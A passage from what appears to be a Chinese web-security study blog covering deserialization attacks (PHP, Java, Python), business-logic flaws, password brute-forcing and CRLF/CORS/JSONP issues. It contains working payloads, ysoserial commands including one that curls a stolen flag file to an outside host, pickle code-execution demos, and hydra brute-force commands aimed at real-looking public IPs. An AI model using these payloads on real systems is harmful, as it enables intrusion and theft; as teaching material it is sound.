+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（4）利用php原生类SoapClient类进行读文件：</span><br><span class="line">PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一</span><br><span class="line">个基于SOAP协议访问Web服务的 PHP 客户端。</span><br><span class="line">该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP</span><br><span class="line">和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在</span><br><span class="line">SSRF 中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span><br></pre></td></tr></table></figure>
+<ul>
+<li>第一个参数是用来指明是否是 wsdl 模式，将该值设为 null 则表示非 wsdl 模式。</li>
+<li>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则<br>
+必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，<br>
+而 uri 是 SOAP 服务的目标命名空间</li>
+</ul>
+<ol>
+<li>
+<h1 id="直接利用soapclient来进行ssrf"><a class="markdownIt-Anchor" href="#直接利用soapclient来进行ssrf">#</a> 直接利用 SoapClient 来进行 SSRF</h1>
+</li>
+<li>
+<?php
+</li>
+</li><li>$a = <strong>new</strong> SoapClient(null, <strong>array</strong> (‘location’=&gt;‘<span class="exturl" data-url="aHR0cDovL2lwOjEwMDAwL2FhYQ==">http://ip:10000/aaa</span>’, ‘uri’=&gt;‘<span class="exturl" data-url="aHR0cDovL2lw">http://ip</span><br>
+:10000’));</li>
+<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>=</mo><mi>s</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>l</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">b = serialize(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">e</span><span class="mopen">(</span></span></span></span>a);</li>
+<li>echo $b;</li>
+<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><mi>u</mi><mi>n</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>l</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">c = unserialize(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">e</span><span class="mopen">(</span></span></span></span>b);</li>
+<li>$c-&gt;a (); // 随便调用对象中不存在的方法，触发__call 方法进行 ssrf</li>
+<li>?&gt;</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（5）本地Demo-xss：</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<?php
+</li>
+</li><li>highlight_file(<strong>file</strong>);</li>
+<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mi>u</mi><mi>n</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>l</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">a = unserialize(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">e</span><span class="mopen">(</span></span></span></span>_GET[‘k’]);</li>
+<li>echo $a;</li>
+<li>?&gt;<br>
+ 输出对象可调用__toString，无代码通过原生类 Exception<br>
+Exception 使用查询编写利用，通过访问触发输出产生 XSS 漏洞</li>
+<li>
+<?php
+</li>
+</li><li>$a= <strong>new</strong> Exception(“<script>alert(‘xiaodi’)</script>”);</li>
+<li>echo urlencode(serialize($a));</li>
+<li>?&gt;</li>
+</ol>
+<h4 id="293-java反序列化利用"><a class="markdownIt-Anchor" href="#293-java反序列化利用">#</a> 2.9.3 java 反序列化利用</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（1）java反序列化漏洞原理：</span><br></pre></td></tr></table></figure>
+<p>序列化是把 Java 对象转换为字节序列的过程，反序列化是把字节序列恢复<br>
+为 Java 对象的过程。对象的序列化主要有两种用途：一是把对象的字节序列永<br>
+久地保存到硬盘上，通常存放在一个文件中即持久化对象，另外就是在网络上<br>
+传送对象的字节序列即网络传输对象。</p>
+<p>（2）java 反序列化识别：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原始数据-&gt;序列化 writeobject-&gt;base64 编码-&gt;传输-&gt;base64 解码-&gt;反序列化</span><br><span class="line">readobject-&gt;最终数据。</span><br><span class="line">反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、</span><br><span class="line">对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。</span><br><span class="line">一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数</span><br><span class="line">据。或者如果以aced开头，那么他就是这一段java序列化的 16 进制。</span><br></pre></td></tr></table></figure>
+<ul>
+<li>base 64 编码可以依靠终端命令，脚本实现或者网络接口来实现，base 64 解密同理</li>
+</ul>
+<p>（3）java 反序列化利用工具推荐：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFs">https://github.com/frohoff/ysoserial</span></p>
+<p>ysoserial 中是针对组件来产生反序列化代码的，URLDNS 是不需要其他组件<br>
+支撑的，但是功能单一，还有依赖于组件产生的漏洞，这种依赖包构造出来的<br>
+反序列化代码会有更多的功能。大部分是需要组件支撑的，版本目前已经跟不<br>
+上现在的组件版本了。<br>
+没组件生成 DNS 利用的 payload：<br>
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS “<span class="exturl" data-url="aHR0cDovLzlhcjd4bC5kbnNsb2cuY24=">http://9ar7xl.dnslog.cn</span>” &gt;<br>
+urldns.ser<br>
+ 借助 rome:1.0 组件生成 payload:<br>
+java -jar ysoserial-master-30099844c6-1.jar ROME “curl <span class="exturl" data-url="aHR0cDovL3gueC54Lng6NDQ0NC8=">http://x.x.x.x:4444/</span> -d<br>
+@/flag” &gt; flag.bin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">根据是否选择组件来生成payload：</span><br><span class="line">生成payload的时候载入当前包（功能比较多）：</span><br><span class="line">java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar</span><br><span class="line">ysoserial.GeneratePayload Hibernate1 &quot;calc.exe&quot; &gt; x.bin</span><br><span class="line">直接利用ysoserial给的参数载入（功能比较少）：</span><br><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 &quot;calc.exe&quot; &gt; y.bin</span><br></pre></td></tr></table></figure>
+<p>（4）java 反序列化解密工具推荐 SerializationDumper</p>
+<p>下载地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05pY2tzdGFEQi9TZXJpYWxpemF0aW9uRHVtcGVy">https://github.com/NickstaDB/SerializationDumper</span></p>
+<p>SerializationDumper 解密的是 ace 开头的数据即 16 进制数据，分析 java 的序<br>
+列化之后的内容。如 java -jar SerializationDumper-v1.13.jar -r urldns.ser &gt; dns.txt。</p>
+<ul>
+<li>java 安全在实战中很难遇到，因为其机制是非常复杂的</li>
+</ul>
+<h4 id="294-py反序列化及魔术方法"><a class="markdownIt-Anchor" href="#294-py反序列化及魔术方法">#</a> 2.9.4 py 反序列化及魔术方法</h4>
+<p>（1）常见 py 反序列化函数：</p>
+<p>pickle.dump (obj, file) : 将对象序列化后保存到文件<br>
+ pickle.load (file) : 读取文件， 将文件中的序列化内容反序列化为对象<br>
+ pickle.dumps (obj) : 将对象序列化成字符串格式的字节流<br>
+ pickle.loads (bytes_obj) : 将字符串格式的字节流反序列化为对象<br>
+ #反序列化调用__reduce__() <strong>reduce_ex</strong>() <strong>setstate</strong> () , 序列化调用__getstate__</p>
+<p><strong>1. #</strong> 魔术方法 <strong><strong>reduce</strong>()</strong> 的使用举例：<br>
+2. <strong>import</strong> pickle<br>
+3. <strong>import</strong> os<br>
+4. <strong>class</strong> A(object):<br>
+5. <strong>def</strong> <strong>reduce</strong>(self):<br>
+6. <strong>print</strong> (‘反序列化调用’)<br>
+7. <strong>return</strong> (os.system,(‘calc’,))<br>
+8. a = A()<br>
+9. p_a = pickle.dumps(a)<br>
+10. pickle.loads(p_a)<br>
+11. <strong>print</strong> (’==========’)<br>
+12. <strong>print</strong> (p_a)</p>
+<h1 id="mac上弹计算器的命令open-systemapplicationscalculatorapp-win则是calc"><a class="markdownIt-Anchor" href="#mac上弹计算器的命令open-systemapplicationscalculatorapp-win则是calc">#</a> mac 上弹计算器的命令 open /System/Applications/Calculator.app ，win 则是 calc</h1>
+<h1 id="反弹shell的命令见-httpsforumywhackcomshellphp"><a class="markdownIt-Anchor" href="#反弹shell的命令见-httpsforumywhackcomshellphp">#</a> 反弹 shell 的命令见 <span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS55d2hhY2suY29tL3NoZWxsLnBocA==">https://forum.ywhack.com/shell.php</span></h1>
+<p><strong>1. #</strong> 魔术方法 <strong><strong>setstate</strong>()</strong> 的使用举例：<br>
+<strong>13. class SerializePerson():<br>
+14. def <strong>init</strong>(self, name):<br>
+15. <span class="exturl" data-url="aHR0cDovL3NlbGYubmFtZQ==">self.name</span> = name<br>
+16. #</strong> 构造 <strong><strong>setstate</strong></strong> 方法<br>
+<strong> 17. def <strong>setstate</strong>(self, name):<br>
+18. os.system(‘calc’) #</strong> 恶意代码<br>
+<strong> 19. tmp = pickle.dumps (SerializePerson (‘tom’)) #</strong> 序列化<br>
+ 20. <strong>pickle.loads(tmp) #</strong> 反序列化 此时会弹出计算器<br>
+<strong> 1.</strong> 魔术方法 <strong><strong>getstate</strong>()</strong> 的使用举例：<br>
+<strong>2. class A(object):</strong></p>
+<p><strong>3. def <strong>getstate</strong>(self):<br>
+4. print(’</strong> 序列化调用 <strong>‘)<br>
+5. os.system(‘calc’)<br>
+6. a = A()<br>
+7. p_a = pickle.dumps(a)<br>
+8. print(’==========’)<br>
+9. print(p_a)</strong></p>
+<p>（2）python 由反序列化漏洞反弹 shell：</p>
+<p>服务器有可以接收序列化对象的内容并且会执行这串序列化内容，一般这<br>
+个序列化数据会经过加密，有可能是采用的普通的 base 64 加密，寻找到可以传<br>
+输序列化数据的地方并且了解此内容是如何执行相关代码的。伪造序列化后的<br>
+数据载入反弹 shell 的代码，再次进行加密，放入到能够使对方执行这串序列化<br>
+数据的位置。<br>
+python 代码审计工具 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5Q1FBL2JhbmRpdA==">https://github.com/PyCQA/bandit</span></p>
+<h3 id="210-业务逻辑漏洞"><a class="markdownIt-Anchor" href="#210-业务逻辑漏洞">#</a> 2.10 业务逻辑漏洞</h3>
+<h4 id="2101-逻辑越权与访问控制"><a class="markdownIt-Anchor" href="#2101-逻辑越权与访问控制">#</a> 2.10.1 逻辑越权与访问控制</h4>
+<p>（1）逻辑越权：</p>
+<p>水平越权：用普通用户 A 去登陆普通用户 B，对方在后台数据库做的验证</p>
+<p>不严谨，可通过篡改数据库疑似权限编号；可用修改用户 A 的数据时抓包将修</p>
+<p>改的信息改成用户 B，漏洞产生的原因是代码中将用户写成了一个动态的数据。</p>
+<p>垂直越权：用普通用户操作管理员的权限，需要去得到管理员添加用户的</p>
+<p>数据包，管理员退出后其 session 会失效，如果可以得到管理员的数据包，将普<br>
+通用户的数据包中 session 给换上，尝试是否存在有管理员的权限。</p>
+<p>（2）访问控制：</p>
+<p>验证是存在的，但是逻辑出现问题导致此验证没有真正被利用；也有可能<br>
+是验证是可以被一些匿名用户或者白名单用户触发后绕过。若验证方式如<br>
+ cookie/jwt/token/session 这些身份认证凭据是脆弱验证，逻辑性不强导致被绕过。<br>
+实际测试中就是去抓包改改参数，看看有没有可能以改变参数的方式修改<br>
+当前权限。</p>
+<h4 id="2102-支付流程及验证失效"><a class="markdownIt-Anchor" href="#2102-支付流程及验证失效">#</a> 2.10.2 支付流程及验证失效</h4>
+<p>（1）支付流程问题：</p>
+<p>常见支付流程：选择商品和数量、选择支付及配送方式、生成订单编号、</p>
+<p>订单支付选择、完成支付；熟悉数据篡改：商品编号 ID，购买价格，购买数量，</p>
+<p>支付方式，订单号，支付状态等；熟悉修改方式：替换支付，重复支付，最小</p>
+<p>额支付，负数支付，溢出支付，优惠券支付等。</p>
+<p>（2）支付流程问题举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如产品价格未被固定，可以通过数据包中修改产品价格；如修改产品数量为- 1 ，从</span><br><span class="line">而改变产品价格；用低价格的产品中的数据包去买高价格的产品；修改优惠券额度。</span><br><span class="line">关键就是找到数据包中没有被固定好的地方，抓取此数据包并进行修改。或者抓取</span><br><span class="line">不通价格、不同产品的物品进行数据包的观察与测试。这些数据应该从数据库中取，而</span><br><span class="line">不是以前端用数据包发送可以修改的数据为准。</span><br></pre></td></tr></table></figure>
+<p>（2）验证码识别：</p>
+<p>验证码是否能够爆破、是否能够重复使用以上一次的验证码来识别本次的<br>
+识别码；找回密码如果根据返回状态来判断验证是否正确可以抓取返回包进行<br>
+绕过；先通过验证，再最后一步的时候将验证的对象改为另一用户尝试；如果<br>
+验证码是从数据包中传输的，可以尝试从数据包中寻找验证码。</p>
+<h1 id="验证码爆破插件推荐-httpsgithubcomsmxiazinew_xp_captcha-可以解决爆破用户"><a class="markdownIt-Anchor" href="#验证码爆破插件推荐-httpsgithubcomsmxiazinew_xp_captcha-可以解决爆破用户">#</a> 验证码爆破插件推荐 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NteGlhemkvTkVXX3hwX0NBUFRDSEE=">https://github.com/smxiazi/NEW_xp_CAPTCHA</span> , 可以解决爆破用户</h1>
+<p>的时候验证码一直在改变的问题，burp 插件验证码识别 xp_CAPTCHA 使用参考地址<br>
+ https:// <span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9wdW5pc2hlZC9wLzE0NzQ2OTcwLmh0bWwlRTMlODAlODJidXJwJUU0JUI4JUFEJUU5JTgwJTlBJUU4JUJGJTg3JUU0JUJEJUJGJUU3JTk0JUE4JUU2JTg5JUE5JUU1JUIxJTk1JUU1JThBJUEwJUU4JUJEJUJEJUU2JUFEJUE0JUU2JThGJTkyJUU0JUJCJUI2JUUzJTgwJTgyJUU1JTg1JThEJUU4JUI0JUI5">http://www.cnblogs.com/punished/p/14746970.html。burp 中通过使用扩展加载此插件。免费</span><br>
+版的识别成功率不高，需要多爆破几次。</p>
+<p>（3）验证码安全修复：</p>
+<p>找回机制要进行每一步验证 - 防绕过重定向、找回机制要进行服务端验证 - 防<br>
+ res 数据修改、找回机制要控制验证码安全 - 防验证码攻击、验证码接口需验证<br>
+后被调用 - 防接口被乱调用、验证码引用智能化人工判断 - 防验证码被识别、验<br>
+证码采用时间段生效失效 - 防验证码被复用。</p>
+<h4 id="2103-弱口令爆破与john解密"><a class="markdownIt-Anchor" href="#2103-弱口令爆破与john解密">#</a> 2.10.3 弱口令爆破与 john 解密</h4>
+<p>（1）弱口令爆破：</p>
+<p>没有严格和准确的定义，通常认为容易被别猜测到或被破解工具破解的口</p>
+<p>令均为弱口令，通常与管理的安全意识和平台的初始化配置等相关，通过系统</p>
+<p>弱口令，可被黑客直接获得系统控制权限。</p>
+<p>在常见的安全测试中，弱口令会产生安全的各个领域，包括 Web 应用，安<br>
+全设备，平台组件，操作系统等；如何获取弱口令，利用弱口令成为了此类安<br>
+全问题的关键。</p>
+<ul>
+<li>弱口令通过 burp 爆破时需要提前观察密码是否被 hash 加密，如果是则需要进行配置</li>
+</ul>
+<p>（2）弱口令相关的链接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">电子邮箱泄漏信息查询地址：</span><br><span class="line">https://monitor.firefox.com/scan、https://haveibeenpwned.com/</span><br><span class="line">利用人的密码习惯,精准分析密码：https://www.bugku.com/mima/</span><br><span class="line">经典密码字典合集：https://github.com/danielmiessler/SecLists</span><br><span class="line">多个来源收集的默认登录名/密码：https://github.com/ihebski/DefaultCreds-cheat-sheet</span><br></pre></td></tr></table></figure>
+<p>（3）hydra 弱口令爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hydra -l guest -P pass.dic ssh://192.168.31.107 -f -t 4 -I -vV -o hydra.ssh</span><br><span class="line">hydra -L user.txt -P sshpass.txt ssh://192.168.31.66 -f -t 4 -I -s 65507 -vV -o hydra.ssh</span><br><span class="line">hydra -L /usr/share/wordlists/rockyou.txt -p pass -s 8080 192.168.31.12 http-post- form</span><br><span class="line">&quot;/:username=^USER^&amp;password^PASS^:Invalid username.&quot;</span><br><span class="line">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P</span><br><span class="line">/usr/share/wordlists/rockyou.txt 192.168.31.25 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh</span><br><span class="line">hydra -l administrator -P UserPassCombo-Jay.txt -t 5 -vV 47.99.218.105 rdp -f</span><br><span class="line">hydra -L test -P 10top1K.txt 47.110.53.159 ftp -V</span><br><span class="line">hydra -l root -P 10top1K.txt 47.110.53.159 ssh -V</span><br><span class="line">hydra -l administrator -P 10top1K.txt 47.110.53.159 rdp -V</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-l 指定用户 guest ，-P 指定字典 ，-f 爆破密码成功后停止</li>
+</ul>
+<ul>
+<li>vV 显示详细过程 - o 将爆破成功信息保存到文件中</li>
+</ul>
+<h1 id="字典推荐httpsgithubcomthekingofduckfuzzdicts"><a class="markdownIt-Anchor" href="#字典推荐httpsgithubcomthekingofduckfuzzdicts">#</a> 字典推荐：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RoZUtpbmdPZkR1Y2svZnV6ekRpY3Rz">https://github.com/TheKingOfDuck/fuzzDicts</span></h1>
+<p>（4）zip 文件解密：</p>
+<ul>
+<li>解密文件受字典的限制，也可以寻找一些比较好一点的字典测试</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt sshpass.zip</span><br><span class="line">zip2join sshpass.zip &gt; ssh.txt</span><br><span class="line">john ssh.txt –wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<h3 id="211-其他漏洞"><a class="markdownIt-Anchor" href="#211-其他漏洞">#</a> 2.11 其他漏洞</h3>
+<h4 id="2111-crlf回车换行漏洞"><a class="markdownIt-Anchor" href="#2111-crlf回车换行漏洞">#</a> 2.11.1 crlf 回车换行漏洞</h4>
+<p>（1）CRLF 注入漏洞：</p>
+<p>是因为 Web 应用没有对用户输入做严格验证，导致攻击者可以输入一些恶<br>
+意字符。攻击者一旦向请求行或首部中的字段注入恶意的 CRLF，就能注入一<br>
+些首部字段或报文主体，并在响应中输出，所以又称为 HTTP 响应拆分漏洞。<br>
+可造成的影响很低。</p>
+<ul>
+<li>vulhub 复现：<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25naW54L2luc2VjdXJlLWNvbmZpZ3VyYXRpb24v">https://vulhub.org/#/environments/nginx/insecure-configuration/</span></li>
+<li>Payload: <span class="exturl" data-url="aHR0cDovL3lvdXItaXA6ODA4MC8lMGElMGRTZXQtQ29va2llOiUyMGE9MSVFRiVCQyU4QyVFNSU4RiVBRiVFNiVCMyVBOCVFNSU4NSVBNVNldC1Db29raWUlRTUlQTQlQjQlRTMlODAlODI=">http://your-ip:8080/%0a%0dSet-Cookie:%20a=1，可注入 Set-Cookie 头。</span></li>
+</ul>
+<p>（2）CRLF 漏洞利用：</p>
+<p>访问特定的 url 地址时，返回数据包中的头部被改变；是一种换行回车漏洞，<br>
+可尝试访问某些 url 地址时，改变返回的数据包；与 xss 漏洞配合，让对方去访<br>
+问自己构造的 url，实现 xss 盗取 cookie；用自动化工具 CRLFuzz 来自动检测对<br>
+方是否存在此漏洞。</p>
+<ul>
+<li>CRLFFuzz：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2R3aXNpc3dhbnQwL2NybGZ1eno=">https://github.com/dwisiswant0/crlfuzz</span></li>
+</ul>
+<h4 id="2112-url重定向与web拒绝服务"><a class="markdownIt-Anchor" href="#2112-url重定向与web拒绝服务">#</a> 2.11.2 url 重定向与 web 拒绝服务</h4>
+<p>（1）URL 重定向跳转</p>
+<p>网站接受用户输入的链接后会进行跳转到另一个地址，本来是用来加载一</p>
+<p>些资源文件的，但是由于过滤不严谨是可以直接跳转到一些页面的。而这个地</p>
+<p>址可以人为的指定，可以配合钓鱼攻击，可以先另存原始 login 页面，在发至自<br>
+己的服务器，进行修改，获取对方提交的用户名和密码。</p>
+<ul>
+<li>拉取到对方源码进行伪造后，需要进行一些修改，将对方 html 界面的数据通过 ajax 或者<br>
+其他方式将 user、pass 的值发送到自己的服务器上，进行钓鱼攻击。</li>
+</ul>
+<p>（2）Web 拒绝服务</p>
+<p>现在有许多资源是由服务器生成然后返回给客户端的，而此类 “资源生成”<br>
+ 接口如若有参数可以被客户端控制（可控），并没有做任何资源生成大小限制，<br>
+这样就会造成拒绝服务风险，导致服务器处理不过来或占用资源去处理。</p>
+<h1 id="比如有一个无限大小的zip文件如果对方自动进行解压就会无限占用对方的资源导"><a class="markdownIt-Anchor" href="#比如有一个无限大小的zip文件如果对方自动进行解压就会无限占用对方的资源导">#</a> 比如有一个无限大小的 zip 文件，如果对方自动进行解压，就会无限占用对方的资源，导</h1>
+<p>致 CPU 占满，网站崩溃。又比如没有做限制的修改图片的尺寸，占用了服务器的资源。</p>
+<h4 id="2113-同源策略与cosp跨域资源"><a class="markdownIt-Anchor" href="#2113-同源策略与cosp跨域资源">#</a> 2.11.3 同源策略与 cosp 跨域资源</h4>
+<p>（1）同源策略：</p>
+<p>同源包括三个条件：同协议、同域名、同端口。</p>
+<p>同源策略限制从一个源加载的文档或脚本与来自另一个源的资源进行交互，</p>
+<p>这是一个用于隔离潜在恶意文件的关键的安全机制。简单说就是浏览器的一种安</p>
+<p>全策略。</p>
+<p>虽然同源策略在安全方面起到了很好的防护作用，但也在一定程度上限制了</p>
+<p>一些前端功能的实现，所以就有了许多跨域的手段。</p>
+<p>（2）COSP 跨域资源：</p>
+<p>CORS 全称 Cross-Origin Resource Sharing, 跨域资源共享，是 HTML5 的一<br>
+个新特性，已被所有浏览器支持，跨域资源共享 (CORS) 是一种放宽同源策略的<br>
+机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了<br>
+ AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据。<br>
+Access-Control-Allow-Origin：指定哪些域可以访问域资源。寻找此漏洞是<br>
+看设置问题，是否通过这个字段来获取资源。</p>
+<ul>
+<li>检测项目：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NoZW5qai9DT1JTY2FubmVy">https://github.com/chenjj/CORScanner</span></li>
+</ul>
+<p>（3）COSP 危害：敏感页面源码获取</p>
+<p>管理员访问页面跨域调用 URL、受害者访问当前页面被资源共享。漏洞产<br>
+生的原因是同源策略防护下配置不当导致，漏洞可以导致用户访问的 URL 上的<br>
+资源丢失。</p>
+<h4 id="2114-jsonp跨域回调"><a class="markdownIt-Anchor" href="#2114-jsonp跨域回调">#</a> 2.11.4 jsonp 跨域回调</h4>
+<p>JSONP 跨域巧妙的利用了 script 标签能跨域的特点，实现了 json 的跨域传输。<br>
+手动访问某网站，查看 callback 信息，看有无回调中有敏感信息，如果有的回<br>
+调信息中有存储，可以自己构造 html 界面，让此 html 界面去访问回调信息并本<br>
+地存储。<br>
+漏洞产生的原因是同源策略下引用资源回调导致，漏洞可以导致用户访问<br>
+的 URL 回调接口个人敏感信息丢失。</p>
+<h1 id="手工审查元素筛选或burp项目httpsgithubcomp1g3jsonp-hunter"><a class="markdownIt-Anchor" href="#手工审查元素筛选或burp项目httpsgithubcomp1g3jsonp-hunter">#</a> 手工审查元素筛选或 Burp 项目 https://github.com/p1g3/JSONP-Hunter</h1>
+<h4 id="2115-域名解析导致子域名接管"><a class="markdownIt-Anchor" href="#2115-域名解析导致子域名接管">#</a> 2.11.5 域名解析导致子域名接管</h4>
+<p>（1）域名解析记录类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A-将域名指向一个IPV 4 地址</span><br><span class="line">CNAME-将域名指向另外一个域名</span><br><span class="line">AAAA-将域名指向一个IPV 6 地址</span><br><span class="line">NS-将子域名指向其他DNS服务器解析</span><br><span class="line">MX-将域名执行邮件服务器地址</span><br><span class="line">SRV-记录提供特定服务的服务器</span><br></pre></td></tr></table></figure>
+<p>（2）子域名接管：</p>
+<p>A 域名通过 CNAME 解析到了 B 域名，而 B 域名又通过 CNAME 解析到了<br>
+ C 域名，那么此时 A 域名是直接解析到了 C 域名下。如果 B 域名过期了且没有<br>
+被注册，那么可以直接通过 B 域名来控制 A 域名的界面，因为 A 域名是一个更<br>
+权威的界面，是更容易让人相信的。</p>
+
+      <div class="tags">
+          <a href="/tags/XIAODI22/" rel="tag"><i class="ic i-tag"></i> XIAODI22</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-07-04 03:46:16" itemprop="dateModified" datetime="2023-07-04T03:46:16+08:00">2023-07-04</time>
+  </span>
+  <span id="2023/07/04/SAFE/2 WEB通用漏洞/" class="item leancloud_visitors" data-flag-title="XD22 Web 通用漏洞" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
